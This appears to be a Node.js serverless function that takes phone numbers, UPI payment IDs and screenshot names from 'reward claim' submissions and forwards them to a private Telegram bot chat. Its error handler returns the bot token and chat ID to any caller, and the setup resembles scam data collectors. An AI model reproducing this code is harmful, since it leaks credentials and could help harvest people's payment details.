const fetch = require('node-fetch');

exports.handler = async (event) => {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    const { phone, upi, screenshotName } = JSON.parse(event.body);
    
    // SECURE: Token loaded from environment variables
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const message = `🎉 New Reward Claim! 🎉
📱 Phone: ${phone}
💳 UPI ID: ${upi}
📸 Screenshot: ${screenshotName}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();
        
        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: data.ok,
                telegramData: data // For debugging
            })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: error.message,
                debug: { TELEGRAM_TOKEN, CHAT_ID } // Only for testing!
            })
        };
    }
};